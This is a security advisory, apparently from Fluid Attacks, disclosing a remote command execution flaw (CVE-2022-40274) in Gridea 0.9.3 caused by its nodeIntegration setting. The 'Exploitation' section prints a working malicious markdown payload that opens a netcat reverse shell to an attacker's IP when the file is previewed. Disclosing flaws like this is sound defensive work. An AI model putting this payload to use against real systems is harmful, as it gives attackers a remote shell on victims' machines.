---
slug: advisories/marshmello/
title: Gridea 0.9.3  -  RCE via nodeIntegration feature
authors: Carlos Bello
writer: cbello
codename: marshmello
product: Gridea 0.9.3
date: 2022-09-26 14:30 COT
cveid: CVE-2022-40274
severity: 8.6
description: Gridea 0.9.3  -  RCE via nodeIntegration feature - Remote command execution
keywords: Fluid Attacks, Security, Vulnerabilities, Gridea, RCE
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                        |
| --------------------- | -------------------------------------------------------|
| **Name**              | Gridea 0.9.3  -  RCE via nodeIntegration feature       |
| **Code name**         | [Marshmello](https://en.wikipedia.org/wiki/Marshmello) |
| **Product**           | Gridea                                                 |
| **Affected versions** | Version 0.9.3                                          |
| **State**             | Public                                                 |
| **Release date**      | 2022-09-26                                             |

## Vulnerability

|                       |                                                                                                        |
| --------------------- | ------------------------------------------------------------------------------------------------------ |
| **Kind**              | Remote command execution                                                                               |
| **Rule**              | [004. Remote command execution](https://docs.fluidattacks.com/criteria/vulnerabilities/004)            |
| **Remote**            | Yes                                                                                                    |
| **CVSSv3 Vector**     | CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H                                                           |
| **CVSSv3 Base Score** | 8.6                                                                                                    |
| **Exploit available** | Yes                                                                                                    |
| **CVE ID(s)**         | [CVE-2022-40274](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40274)                        |

## Description

Gridea version 0.9.3 allows an external attacker to execute arbitrary
code remotely on any client attempting to view a malicious markdown
file through Gridea. This is possible because the application has the
`nodeIntegration` option enabled.

## Vulnerability

This vulnerability occurs because the application has the `nodeIntegration`
option enabled.  Due to the above, an attacker can embed malicious JS code
in a markdown file and send it to the victim for viewing to achieve an RCE.

## Exploitation

To exploit this vulnerability, you must send the following file to a user to
open with Gridea. The exploit is triggered when the user presses `CTRL+P` or
simply clicks `preview`.

### exploit.md

```markdown
<img src=1 onerror="require('child_process').exec('nc 192.168.20.38 4444 -e /bin/bash');"/>
```

## Evidence of exploitation

![RCE-Gridea](https://user-images.githubusercontent.com/51862990/189430881-5d6db562-d650-42c1-af7b-bc0626d9dc89.gif)

## Our security policy

We have reserved the CVE-2022-40274 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: Gridea 0.9.3

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/getgridea/gridea>

## Timeline

<time-lapse
  discovered="2022-09-08"
  contacted="2022-09-08"
  replied=""
  confirmed=""
  patched=""
  disclosure="2022-09-26">
</time-lapse>
